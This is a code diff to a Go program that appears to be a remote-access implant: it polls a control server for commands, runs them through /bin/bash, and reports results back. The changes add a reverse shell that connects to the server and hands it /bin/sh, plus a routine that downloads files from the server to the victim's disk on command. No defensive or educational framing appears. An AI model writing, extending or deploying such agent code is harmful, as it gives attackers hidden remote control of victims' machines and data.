@@ -9,6 +9,7 @@ package main
 import (
 	"encoding/json"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"net"
 	"net/http"
@@ -147,6 +148,37 @@ func submitResult(registerkey string, ip string, result string) {
 	fmt.Println(jsonData)
 }
 
+func reverseshell(serverip string, port string) {
+	server := serverip + ":" + port
+	conn, _ := net.Dial("tcp", server)
+	cmd := exec.Command("/bin/sh")
+	cmd.Stdin = conn
+	cmd.Stdout = conn
+	cmd.Stderr = conn
+	cmd.Run()
+}
+
+func download(endpoint string, destination string) (err error) {
+	//filename := path.Base(endpoint)
+	//var data = url.Values{
+	//	"registerkey": {registerkey}}
+
+	resp, err := http.Get(endpoint)
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
+
+	f, err := os.Create(destination)
+	if err != nil {
+		return
+	}
+	defer f.Close()
+
+	_, err = io.Copy(f, resp.Body)
+	return
+}
+
 /*
 Description: Executes commands that was fetched from the server.
 The commands are categorized as "upload", "download", "shell", and simple_exec.
@@ -160,12 +192,24 @@ func executeCommand(command string) string {
 	//if err != nil {
 	//	fmt.Println(err)
 	//}
-	// Simple_Exec
-	out, err := exec.Command("/bin/bash", "-c", command).CombinedOutput()
-	if err != nil {
-		return err.Error() + string(out)
+	commandSlice := strings.Split(command, " ")
+
+	if commandSlice[0] == "download" {
+		fmt.Println("implement download here ")
+		endpoint := URL + "/download/" + commandSlice[1]
+		download(endpoint, commandSlice[2])
+		return ""
+	} else if commandSlice[0] == "shell" {
+		port := commandSlice[1]
+		go reverseshell(SERVERIP, port)
+		return ""
+	} else {
+		out, err := exec.Command("/bin/bash", "-c", command).CombinedOutput()
+		if err != nil {
+			return err.Error() + string(out)
+		}
+		return string(out)
 	}
-	return string(out)
 }
 
 func main() {
@@ -211,7 +255,6 @@ func main() {
 
 		// Everything is fine. Try to fetch command.
 		command := fetchCommand(registerkey, ip)
-		fmt.Println("Command: ", command)
 
 		if strings.Contains(command, "[-]") == true {
 			fmt.Println("[-] Sleeping... ")
@@ -219,6 +262,7 @@ func main() {
 			continue
 		}
 
+		fmt.Println("Command: ", command)
 		execute_result := executeCommand(command)
 		fmt.Println("[+] Result: ", execute_result)
 		submitResult(registerkey, ip, execute_result)
